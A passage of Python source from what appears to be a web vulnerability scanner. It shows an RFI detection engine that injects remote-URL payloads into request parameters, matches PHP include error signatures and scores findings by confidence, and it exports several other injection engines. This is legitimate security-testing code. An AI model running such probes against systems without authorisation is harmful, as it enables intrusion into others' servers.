    # 后端尝试包含远程资源时的错误签名（出现即证明 allow_url_include 生效）
    RFI_ERROR_SIGNATURES = [
        "php_network_getaddresses",
        "getaddrinfo failed",
        "failed to open stream: http request failed",
        "failed to open stream: no suitable wrapper",
        "failed opening 'http",
        "failed opening '//",
        "include(): failed opening",
        "require(): failed opening",
    ]

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        if normal_resp is None or not isinstance(normal_resp, tuple) or len(normal_resp) < 2:
            try:
                resp = await async_get(url, session=session, timeout=5, no_retry=True)
                if isinstance(resp, tuple) and len(resp) >= 2:
                    normal_resp = (resp[0], resp[1] if resp[1] else "", resp[2] if len(resp) > 2 else {})
                else:
                    return None
            except BaseException:
                return None

        normal_status = normal_resp[0]

        payloads = self.get_payloads(param)
        for payload, desc in payloads:
            try:
                attack_url = build_attack_url(url, param, payload, parsed_query)
                resp = await async_get(attack_url, session=session, timeout=10, no_retry=True)
                if not isinstance(resp, tuple) or len(resp) < 2:
                    continue

                status = resp[0]
                text = resp[1] or ""
                error_hit = self._match_rfi_error(text)

                if error_hit:
                    # A/B 差异二次确认，进一步压低误报
                    has_diff, diff_ratio = self.has_response_diff(normal_resp, (status, text, {}))
                    if has_diff or status != normal_status:
                        return {
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'type': 'RFI',
                            'ai_verdict': '高（远程包含错误签名）',
                            'confidence': 'high',
                            'evidence': error_hit[:200],
                            'diff_ratio': diff_ratio,
                            'attack_url': attack_url,
                            'description': f"{desc}: 后端尝试包含远程资源并出现网络错误",
                        }

                # 无错误签名但响应显著变化 → 低置信度候选（交由验证阶段）
                elif status in (500, 502, 503) and normal_status not in (500, 502, 503):
                    has_diff, diff_ratio = self.has_response_diff(normal_resp, (status, text, {}))
                    if has_diff and diff_ratio > 0.4:
                        return {
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'type': 'RFI(疑似)',
                            'ai_verdict': '中（响应异常）',
                            'confidence': 'medium',
                            'evidence': f"注入远程URL后响应 {status}（正常 {normal_status}），差异 {diff_ratio:.1%}",
                            'diff_ratio': diff_ratio,
                            'attack_url': attack_url,
                        }
            except asyncio.CancelledError:
                raise
            except Exception as e:
                self.log_debug(f"RFI 检测异常 {param}: {e}")

        return None

    def _match_rfi_error(self, text: str) -> str:
        if not text:
            return ""
        text_lower = text.lower()
        for sig in self.RFI_ERROR_SIGNATURES:
            if sig in text_lower:
                # 提取命中行作为证据
                for line in text.split('\n'):
                    if sig in line.lower():
                        return line.strip()
                return sig
        return ""


# ============================================================
# 导出
# ============================================================
__all__ = [
    'XSSEngine',
    'SQLiEngine',
    'LFIEngine',
    'CMDIEngine',
    'SSTIEngine',
    'NoSQLEngine',
    'RFIEngine',
]
